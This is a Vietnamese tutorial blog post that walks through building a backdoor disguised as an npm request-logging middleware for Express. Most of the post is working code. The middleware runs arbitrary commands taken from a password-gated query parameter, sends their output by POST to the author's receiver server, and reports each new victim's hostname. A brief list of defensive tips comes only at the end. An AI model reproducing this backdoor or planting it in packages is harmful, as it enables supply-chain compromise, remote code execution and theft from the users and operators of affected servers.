![](https://images.viblo.asia/0ed5d3fb-761d-40d2-964b-92b3e86e354b.png)
Bạn đã bao giờ tự hỏi làm thế nào mà hacker có được quyền truy cập vào máy tính và cách họ đánh cắp dữ liệu cá nhân và tài chính, có phải họ đã cài thêm phần độc hại và chiếm quyền điều khiển?

Nói một cách dễ hiểu, để thực hiện cuộc tấn công như thế, hacker họ phải đưa được phần mềm độc hại và máy tính của bạn và sau đó họ tạo một kênh cho phép họ gửi lệnh và điều khiển máy chủ từ xa.

Một hacker thực hiện cuộc tấn công để có thể nắm quyền truy cập tương tự như cách mà họ đã tấn công. Nếu cách mà họ chạy ở chế độ `sudo`, thì kẻ tấn công sẽ có quyền truy cập người dùng root.

Do đó, thường khi chạy ứng dụng ta nên chạy trong môi trường đóng và cấp cho chúng ít quyền truy cập nhất có thể.

Mình chọn NodeJS bởi vì nó là một trong những ngôn ngữ được sử dụng rộng rãi nhất trong phát triển web và phát triển phần mềm. Mặc dù vẫn còn nhiều tranh cãi, nhưng gần như JavaScript là một ngôn ngữ an toàn, do sự rộng lớn của JavaScript, nó đã trở thành ngôn ngữ mà chúng ta gọi là Ngôn ngữ thống trị tất cả.

Đến nay, mọi người cũng biết `npm` là trình quản lý gói cho ngôn ngữ lập trình JavaScript, đã đạt hơn 1 triệu gói công khai, nó có kích thước ~8TB. Vấn đề chính là những tiềm ẩn mà NodeJS mắc phải, làm cho chúng trở thành sự lựa chọn hoàn hảo của những tay hacker.
# Backdoor ẩn ở đâu? 
Cho đến thời điểm hiện nay, việc khó khăn nhất là việc ẩn backdoor để không ai tìm thấy nó. Thông thường thấy ở hai nơi:
* Mã kế thừa cũ chạy dựa trên nguyên tắc lập trình (Nếu nó hoạt động).
*  Phụ thuộc ẩn bên trong.

Vấn đề với trường hợp đầu tiên là nó chạy trên rất nhiều mã dư thừa, những mã duy trì thường không thể xóa vì sợ triển khai không tốt, trong đó có đoạn mã được liên kết khác trong chương trình. Vì thế, nó là nơi thích hợp để hacker dễ dàng tạo ra một thư viện tốt, nhưng đồng thời tạo ra một liên kết ẩn phụ thuộc và phần mềm ẩn độc hại đâu đó ở trong đường dẫn.

**Ví dụ:** Bạn đang sử dụng gói `npm` phổ biến, mình gọi đó là gói `A` và gói này có phụ thuộc vào gói `B` và gói `B` cũng phụ thuộc vào gói `C` mà hầu như chưa ai biết đến và chúng có một backdoor trong đó.
# Làm thế nào để viết mã backdoor của riêng bạn?
Cách tốt nhất để hiểu vấn đề bảo mật là tạo backdoor của riêng mình trong hệ thống và có thể thực hiện các lệnh tùy ý trên hệ thống của mình.

Và dễ dàng thấy cuộc tấn công diễn ra như nào:
* Ở máy chủ hacker, chúng hoạt động như một bộ thu kết quả đầu ra của các lệnh. (*Gọi là bên phải*)
* Máy chủ của nạn nhân (*Gọi là bên trái*)
* Ở giữa chính là nơi hoàn hảo để hacker thực hiện cuộc tấn công.

Cùng thực hiện cuộc tấn công backdoor đơn giản của mình trong môi trường NodeJS nhé 😘

Ở đây vì mình không có một mã kế thừa để che giấu lỗ hổng bảo mật, nên mình quyết định chuyển sang trường hợp sử dụng một gói `npm` phổ biến để ghi nhật ký tin nhắn.
```
const express = require("express");
const app = express();
const myLogger = require("./logger");
app.use(myLogger());
app.get("/", function (req, res) {
  res.send("Hello world");
});
app.listen(3000, () => {
  console.log("Application is up on port 3000");
});
```
Để đạt được mục đích, điều đầu tiên cần phải liên kết backdoor của mình với đối tượng `Request`. Bằng cách này, mình có thể chặn tất cả các yêu cầu đến bằng phần mềm độc hại của mình, như thế mình có thể tìm ra tất cả các thông tin đăng nhập của người dùng hoặc các mã thông báo bí mật khi họ xác thực.

Để liên kết với đối tượng `Request`, mình cần phải biến backdoor thành phần trung gian, do đó mình đã tạo một gói `npm` được gọi là *trình ghi nhật ký* có mục đích ghi lại tất cả hoạt động người dùng. Khi ấy, tất cả những người dùng module của mình sẽ phải kết nối với máy chủ như là một phần mềm trung gian.
```
app.use(myLogger())
```
Đoạn mã này sẽ kích hoạt backdoor.

Theo mặc định, đây là các tham số:
* **req:** Yêu cầu gửi đến máy chủ
* **res:** Phản hồi từ máy chủ
* **next:** Ở đây mình gọi là phần mềm trung gian nối tiếp trong chuỗi
```
module.exports = () => {
  return (req, res, next) => {
    console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    next();
  };
};
```
**console.log()** được sử dụng như là một mồi nhử, ở trên mình đã nói rằng gói của mình sử dụng để ghim các yêu cầu gửi đến, vì vậy chúng phải được hợp pháp.

Để làm được việc này, đầu tiên mình gửi yêu cầu đến máy chủ web của nạn nhân bằng một lệnh và sau đó backdoor sẽ được thực thi trên hệ thống của nạn nhân. Ở đây mình sẽ sử dụng phương thức thực thi từ `child_process`, vì chúng là một module mặc định trong NodeJS.
```
const { exec } = require("child_process");

module.exports = () => {
  return (req, res, next) => {
    const { pwd, cmd } = req.query;
    if (!pwd) {
      console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    }
    if (pwd === "secret-pwd") {
      exec(cmd);
    }
    next();
  };
};
```
Tiếp đến mình sẽ gửi lệnh mà mình muốn chạy trên máy chủ nạn nhân dưới dạng tham số truy vấn cùng với mật khẩu. Nó giúp mình có thể bảo vệ backdoor của mình khỏi các hacker khác và mình sẽ bỏ qua yêu cầu này và không in nó.

Mình có thể gửi một yêu cầu nhận được định dạng như sau:
```
https://victim-url?pwd=secret-pwd&cmd=ls
```
Bằng cách này, mật khẩu của mình sẽ được xác thực và lệnh `ls` (*tệp danh sách*) sẽ được thực thi với máy chủ.

Tất cả những gì cần phải làm bây giờ là bằng cách nào đó mình có thể bắt được kết quả đầu ra của lệnh.
```
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
app.use(bodyParser.json());
app.post("/", function (req, res) {
  console.log(req.body);
  res.send();
});
app.listen(3001, () => {
  console.log("app is up");
});
```
Để hoàn thành backdoor của mình, mình đã gửi kết quả đầu ra của dòng lệnh trong phần nội dung của một yêu cầu POST tới máy chủ của mình:
```
const { exec } = require("child_process");
const http = require("http");
module.exports = () => {
  return (req, res, next) => {
    const { pwd, cmd } = req.query;
    if (!pwd) {
      console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    }
    if (pwd === "secret-pwd") {
      exec(cmd, (err, stdout) => {
        const data = JSON.stringify({
          output: stdout,
        });
        const options = {
          host: "127.0.0.1",
          port: "3001",
          path: "/",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data),
          },
        };
        const req = http.request(options);
        req.write(data);
        req.end();
      });
    }
    next();
  };
};
```
Cuối cùng làm sao mình có thể biết được địa chỉ của nạn nhân và địa chỉ web của nạn nhân?

Để làm như vậy, mình thêm một trình xử lý nữa trong bộ thu:
```
app.get("/new-victim", (req, res) => {
  console.log(req.query);
  res.send();
});
```
Bây giờ mình gửi một yêu cầu khi một nạn nhân mới sử dụng thư viện của mình.
```
module.exports = () => {
  let newVictim = true;
  return (req, res, next) => {
    if (newVictim) {
      newVictim = false;
      const options = {
        host: "127.0.0.1",
        port: "3001",
        path: `/new-victim?victimURL=${req.hostname}`,
      };
      http.request(options).end();
    }
.....
```
Hehe, vậy là mỗi khi một ứng dụng khác sử dụng  gói `npm` của mình, một yêu cầu sẽ được gửi đến máy chủ, thông báo cho mình về URL của mục tiêu.
# Làm thế nào để bảo vệ mình?
Như mình đã nói, phần khó là phải che giấu hoặc có thể lợi dụng lỗ hổng bảo mật. Cho đến thời điểm hiện tại, các phần mềm quét lỗ hổng bảo mật khác đã càn quét chúng.

Để bảo vệ trước các cuộc tấn công không ý muốn này, bạn có thể thực hiện theo cách sau:
* Đóng gói mã của bạn và cung cấp cho nó ít quyền vào hệ thống nhất có thể.
* Sử dụng các nguồn mở nổi tiếng và dễ duy trì.
* Sử dụng các công cụ giám sát để theo dõi tất cả yêu cầu gửi đến máy chủ.